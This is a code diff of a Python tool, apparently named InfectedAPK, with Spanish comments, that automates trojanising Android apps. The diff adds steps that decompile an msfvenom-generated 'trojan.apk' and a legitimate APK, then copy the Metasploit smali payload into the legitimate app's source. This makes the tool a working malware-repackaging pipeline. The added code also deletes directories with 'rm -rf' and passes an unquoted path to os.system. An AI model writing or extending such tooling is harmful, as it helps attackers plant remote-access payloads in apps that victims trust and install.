@@ -128,7 +128,7 @@ def menu_linux_descomprimir_apk(ruta_apks):
         print(f"\nHa seleccionado descomprimir: {apk_seleccionado}")
 
         apk_path = os.path.join(ruta_apks, apk_seleccionado)
-        
+
         # Descomprimir el archivo .zip directamente al directorio
         resultUnzipCompressedApk = subprocess.run(["unzip", "-j", apk_path, "-d", ruta_apks])
 
@@ -154,9 +154,22 @@ def decompileApk(apk_file):
 
     # Verificar si el archivo APK existe y es legible
     if os.path.exists(apk_file) and os.access(apk_file, os.R_OK):
-        print(f"\n\nDecompilando APK con apktool...\n")
+        # Verificar si el directorio ya existe
+        if os.path.exists(apk_file_without_extension):
+            print(f"\n\nBorrando antiguo decompilado y decompilando nuevamente...\n")
+            # Intentar eliminar el directorio previamente decompilado
+            try:
+                subprocess.run(["rm", "-rf", apk_file_without_extension], check=True)
+                print(f"Antiguo directorio decompilado eliminado correctamente.")
+            except subprocess.CalledProcessError as e:
+                print(f"Error al eliminar el directorio antiguo decompilado: {e}")
+                sys.exit(1)
+
+        # Decompilar el APK
+        print(f"\nDecompilando APK con apktool...\n")
         resultDecompileApk = subprocess.run(["apktool", "d", apk_file, "-o", apk_file_without_extension])
 
+        # Verificar si la decompilación fue exitosa
         if resultDecompileApk.returncode == 0:
             print(f"\nAPK decompilado con éxito en {apk_file_without_extension}.")
         else:
@@ -188,6 +201,7 @@ def msfvenomGenerateApk(trojanApkRoute):
 
 def evilApkDecompile(compiledEvilApk, decompiledEvilApk):
     if not os.path.exists(decompiledEvilApk):
+        print(f"\n\n{compiledEvilApk}")
         print(f"Decompilando troyano.apk\n")
 
         evilApkDecompileResult = subprocess.run(["apktool", "d", compiledEvilApk, "-o", decompiledEvilApk])
@@ -197,6 +211,45 @@ def evilApkDecompile(compiledEvilApk, decompiledEvilApk):
         else:
             print(f"\nError al decompilar el APK maligno {compiledEvilApk}.")
             sys.exit(1)
+
+def copyEvilSmali(ruta_apks, ruta_trojan_apk):
+    if not os.path.exists(ruta_apks):
+        print(f"\nError: No se encuentran APKs en {ruta_apks}.\n")
+        return
+
+    carpetas = [f for f in os.listdir(ruta_apks) if os.path.isdir(os.path.join(ruta_apks, f)) and f != 'trojan']
+
+    if not carpetas:
+        print(f"\nNo se encontraron proyectos para troyanizar en la ruta {ruta_apks}.")
+        return
+
+    print("\nProyectos disponibles en la ruta:")
+    for idx, carpeta in enumerate(carpetas, start=1):
+        print(f"{idx}. {carpeta}")
+
+    try:
+        seleccion = int(input("\nSeleccione el número del proyeccto que se va a troyanizar: "))
+        if seleccion < 1 or seleccion > len(carpetas):
+            print("Selección inválida.")
+            return
+
+        carpeta_seleccionada = carpetas[seleccion - 1]
+        print(f"\nHa seleccionado troyanizar el proyecto: {carpeta_seleccionada}")
+
+        carpeta_path = os.path.join(ruta_apks, carpeta_seleccionada)
+        print(f"\nTroyanizando el proyecto: {carpeta_path}")
+
+        ruta_smali_apk_legitima = os.path.join(carpeta_path, "smali", "smali", "com", "metasploit")
+        copy_malicious_smali_to_apk_legit_route = os.path.join(carpeta_path, "smali")
+
+        if not os.path.exists(ruta_smali_apk_legitima):
+            print(f"\nCopiando ficheros Smali malignos a APK original.")
+            os.chdir(ruta_trojan_apk)
+            os.system(f"tar -cf - ./smali | (cd {copy_malicious_smali_to_apk_legit_route}; tar -xpf -)")
+
+    except ValueError:
+        print("\nEntrada inválida. Por favor ingrese un número.")
+
 
 def verificar_programa_windows(programa):
     result_verificar_programas_windowsx = subprocess.run(["where", programa])
@@ -270,6 +323,10 @@ def main():
             compiledEvilApk = "/home/Documents/InfectedAPK/APKs/trojan.apk"
             decompiledEvilApk = "/home/Documents/InfectedAPK/APKs/trojan"
             evilApkDecompile(compiledEvilApk, decompiledEvilApk)
+
+            ruta_apks = "/home/Documents/InfectedAPK/APKs"
+            ruta_trojan_apk = "/home/Documents/InfectedAPK/APKs/trojan/"
+            copyEvilSmali(ruta_apks, ruta_trojan_apk)
 
         elif sistema == "nt":
             repoUrl = "https://github.com/APKentiTEAM/InfectedAPK.git"
